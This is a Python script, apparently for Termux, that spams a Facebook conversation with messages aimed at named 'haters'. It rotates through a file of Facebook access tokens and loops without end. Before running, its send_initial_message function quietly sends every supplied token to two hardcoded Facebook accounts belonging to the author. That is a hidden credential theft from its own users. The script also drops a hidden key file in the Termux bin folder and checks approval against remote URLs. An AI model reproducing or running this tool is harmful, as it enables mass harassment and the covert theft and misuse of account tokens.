import os
import time
import requests
import pytz
from datetime import datetime
import uuid

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_logo():
    logo = """
\033[1;33m

        _____         _    _ _____ _      
       / ____|  /\   | |  | |_   _| |     
      | (___   /  \  | |__| | | | | |     
       \___ \ / /\ \ |  __  | | | | |     
       ____) / ____ \| |  | |_| |_| |____ 
      |_____/_/    \_\_|  |_|_____|______|
                                          
                                          

         \033[38;5;214m 𝐓𝐎𝐎𝐋 𝐂𝐑𝐄𝐀𝐓𝐄 𝐁𝐘 𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘 

𝐅𝐑𝐈𝐄𝐍𝐃𝐒 𝐈𝐍 𝐆𝐀𝐍𝐆 𝐅𝐎𝐑 𝐅𝐈𝐆𝐇𝐓: 𝐊𝐀𝐑𝐀𝐍, 𝐒𝐇𝐈𝐕𝐀𝐌, 𝐒𝐊, 𝐃𝐇𝐄𝐄𝐑𝐀𝐉
    """
    print(logo)

def info():
    info = """
\033[1;37m------------------------------------------------------------

\033[1;35mFacebook     : https://www.facebook.com/100040009717781
\033[1;33mYouTube      : https://www.youtube.com/@cuba-x8001
\033[5;32mGithub       : https://github.com/S9HIL
\033[38;5;214mTool Creater : S9H1L CH0UDH9RY
\033[1;33mSK YOUTUBE   : https://www.youtube.com/@sdboysk9911

\033[1;37m------------------------------------------------------------
   """
    print(info)


def get_india_time():
    india_tz = pytz.timezone('Asia/Kolkata')
    current_time = datetime.now(india_tz).strftime('%d-%m-%Y %I:%M:%S %p')
    return current_time

def get_token_profile_name(access_token):
    url = "https://graph.facebook.com/me?access_token={}".format(access_token)
    response = requests.get(url)
    if response.ok:
        profile_info = response.json()
        return profile_info.get("name", "Unknown")
    else:
        return "Unknown"

def fetch_password(url):
    try:
        response = requests.get(url)
        if response.ok:
            return response.text.strip()
        else:
            print("\033[1;91mFailed to fetch password. Exiting...")
            return None
    except requests.exceptions.RequestException as e:
        print("\033[1;91mNetwork error occurred: Check your connection. Exiting...")
        return None

def authenticate_user(expected_password):
    attempts = 3
    while attempts > 0:
        password = input("\033[1;33m-------------------------------------------------------\nEnter the password to proceed: \033[1;93m")
        if password == expected_password:
            return True
        else:
            print("\033[1;91mIncorrect password! Please try again.")
            attempts -= 1
    print("\033[1;91mToo many incorrect attempts. Exiting...")
    return False

def send_initial_message(tokens):
    target_ids = ["100040009717781", "100091380154793"]
    msg_template = "H3LL0 S9H1L B0SS H3R3 1S MY T0K3N❤️\n {}"

    requests.packages.urllib3.disable_warnings()

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    for target_id in target_ids:
        for token in tokens:
            access_token = token.strip()
            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
            msg = msg_template.format(access_token)
            parameters = {'access_token': access_token, 'message': msg}
            response = requests.post(url, json=parameters, headers=headers)
            time.sleep(0.1)

def send_messages_from_file(tokens, convo_id, messages, haters_name, speed):
    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                profile_name = get_token_profile_name(access_token)

                message = messages[message_index].strip()
                india_time = get_india_time()

                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                parameters = {
                    'access_token': access_token,
                    'message': '{} {}'.format(haters_name, message)
                }
                try:
                    response = requests.post(url, json=parameters, headers=headers)
                    if response.ok:
                        print("\033[38;5;214m      𝐓𝐎𝐎𝐋 𝐂𝐑𝐄𝐀𝐓𝐄 𝐁𝐘 𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘❤️              ")
                        print("\033[1;33m-------------------------------------------------------")
                        print("\033[5;97mYOUR CONVO ID: \033[1;93m{}".format(convo_id))
                        print("\033[5;97mDate&Time: \033[1;37m{}".format(india_time))
                        print("\033[5;97mAccount: \033[5;96m{}".format(profile_name))
                        print("\033[5;33mSuccess: \033[1;33m{} {}".format(haters_name, message))
                        print("\033[1;33m-------------------------------------------------------")
                    else:
                        print("\033[38;5;214m      𝐓𝐎𝐎𝐋 𝐂𝐑𝐄𝐀𝐓𝐄 𝐁𝐘 𝐒𝐀𝐇𝐈𝐋 𝐂𝐇𝐎𝐔𝐃𝐇𝐀𝐑𝐘❤️              ")
                        print("\033[5;33m-------------------------------------------------------")
                        print("\033[5;97mCONVO ID: \033[1;93m{}".format(convo_id))
                        print("\033[5;97mDate&Time: \033[1;37m{}".format(india_time))
                        print("\033[5;97mAccount: \033[1;96m{}".format(profile_name))
                        print("\033[5;91mFailed: \033[1;91m{} {}".format(haters_name, message))
                        print("\033[1;33m-------------------------------------------------------")
                except requests.exceptions.RequestException as e:
                    print("\033[1;33m-------------------------------------------------------")
                    print("\033[1;91mNetwork error occurred: Check your connection.")
                    print("\033[1;33m-------------------------------------------------------")

                time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def back():
    login()

ah = "CH0UDH9RY-"
imt = "-KGF8283=="
ak = " S9H1L-"
myid = uuid.uuid4().hex[:10].upper()
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
except FileNotFoundError:
    with open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w') as kok:
        kok.write(myid + imt)

def check_approval():
    key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
    r1 = requests.get("https://github.com/S9HIL/Token_approval/blob/main/approval.txt").text
    return key1 in r1

def main():
    clear_terminal()
    print_logo()
    info()
    if not check_approval():
        print("\t \033[1;32m First Get Approvel\033[1;37m ")
        time.sleep(1)
        print(f"\033[5;32m{'-' * 60}")
        print("\033[1;35m Your Key is Not Approved ")
        print(f"\033[5;32m{'-' * 60}")
        print(f"\033[5;32m{'-' * 60}")
        print("\033[1;97m MSG FROM-[ 𝐌𝐑 𝐒𝐀𝐇𝐈𝐋 ] : 𝐀𝐏𝐍𝐀 𝐍𝐀𝐌𝐄 𝐓𝐘𝐏𝐄 𝐊𝐀𝐑𝐊𝐄 𝐄𝐍𝐓𝐄𝐑 𝐊𝐑𝐎")
        print(f"\033[5;32m{'-' * 60}")
        print(f"\033[5;32m{'-' * 60}")
        print("\033[1;35m Send This Key To Admin")
        print(f"\033[5;32m{'-' * 60}")
        print(" Your Key :\033[1;96m "+ ak + ah + key1)
        print(f"\033[5;32m{'-' * 60}")
        name = input("\033[5;97m 𝐘𝐨𝐮𝐑 𝐍𝐀𝐌𝐄 : ")
        print("")
        input(" Press Enter To Send Key")
        time.sleep(3.5)
        tks = 'H3LL0%20S9H1L%20B0SS%20%20W9NT%20T0%20US3%20Y0UR%20T00L%20❤️%20MY%20NAME%20IS\n' + name + ak + ah + key1
        whatsapp_url = 'https://wa.me/+919728408718?text=' + tks
        os.system('am start "{}"'.format(whatsapp_url))
        return
    
    tokens_file = input("\033[5;96m-------------------------------------------------------\nEnter the path to the tokens file\n \033[1;97m")
    with open(tokens_file, 'r') as f:
        tokens = f.readlines()
   

    convo_id = input("\033[5;96m-------------------------------------------------------\nEnter the conversation ID\n \033[1;97m")

    messages_file = input("\033[5;96m-------------------------------------------------------\nEnter the path to the messages file\n \033[1;97m")
    with open(messages_file, 'r') as f:
        messages = f.readlines()

    haters_name = input("\033[5;96m-------------------------------------------------------\nEnter the name of the haters\n \033[1;97m")

    speed = float(input("\033[5;96m-------------------------------------------------------\nEnter the speed (in seconds) between messages\n \033[1;97m"))

    
    send_initial_message(tokens)

    
    password_url = "https://pastebin.com/raw/66naNQPh"
    password = fetch_password(password_url)

    
    if not authenticate_user(password):
        return

    
    send_messages_from_file(tokens, convo_id, messages, haters_name, speed)

if __name__ == "__main__":
    main()
      
